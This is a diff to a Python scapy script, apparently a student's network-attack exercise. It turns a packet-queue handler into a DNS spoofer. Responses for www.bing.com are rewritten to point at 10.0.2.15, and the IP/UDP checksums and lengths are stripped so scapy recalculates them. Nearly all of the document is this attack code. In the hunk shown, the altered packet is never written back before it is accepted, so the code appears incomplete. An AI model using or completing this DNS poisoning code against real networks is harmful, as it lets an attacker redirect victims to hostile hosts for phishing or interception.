@@ -25,9 +25,27 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload()) #store packet as a variable;
     #wrapped in scapy layer that lets you access layers of packet using scapy;
     #then able to modify
-    print(packet)
-    print(packet.getpayload()) #shows raw output of packet
-    print(scapy_packet.show()) #using new scapy created var, show fields of packet
+    if scapy_packet.haslayer(scapy.DNSRR):
+        qname = scapy_packet[scapy.DNSQR].qname
+        if "www.bing.com" in qname:
+            print("[+] Spoofing target")
+            dns_answer = scapy.DNSRR(rrname = qname, rdata = "10.0.2.15")   #DNSRR - DNS response
+            scapy_packet[scapy.DNS].an = dns_answer
+            scapy_packet[scapy.DNS].ancount = 1 #change answer count to just 1;
+            #most websites will have multiple responses for DNS records ie bing.com
+            
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].chksum
+            del scapy_packet[scapy.UDP].len
+            #scapy will automatically recalculate these fields when it send them
+            
+            
+            
+        #print(scapy_packet.show())
+    #print(packet)
+    #print(packet.getpayload()) #shows raw output of packet
+    #print(scapy_packet.show()) #using new scapy created var, show fields of packet
     #packet.drop() #drop packets, connectivity cut
     packet.accept() #forward packets to target, connectivity seems normal
 
